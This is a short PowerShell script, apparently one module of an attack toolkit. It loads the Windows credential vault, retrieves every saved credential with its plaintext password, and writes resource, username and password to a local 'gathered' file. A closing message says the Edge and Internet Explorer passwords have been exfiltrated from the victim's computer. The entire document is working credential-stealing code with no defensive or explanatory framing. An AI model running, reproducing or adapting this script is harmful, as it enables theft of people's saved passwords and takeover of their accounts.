$parent=Split-Path -Path $PSScriptRoot -Parent
$filename=$parent+"\gathered\BrowserPasswords.txt"
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$creds = (New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll()
foreach ($c in $creds) {$c.RetrievePassword()}
$creds | Format-List -Property Resource,UserName,Password | Out-File $filename
echo "Microsoft Edge and Internet Explorer passwords exfiltrated to '$filename' on vitim's computer"
exit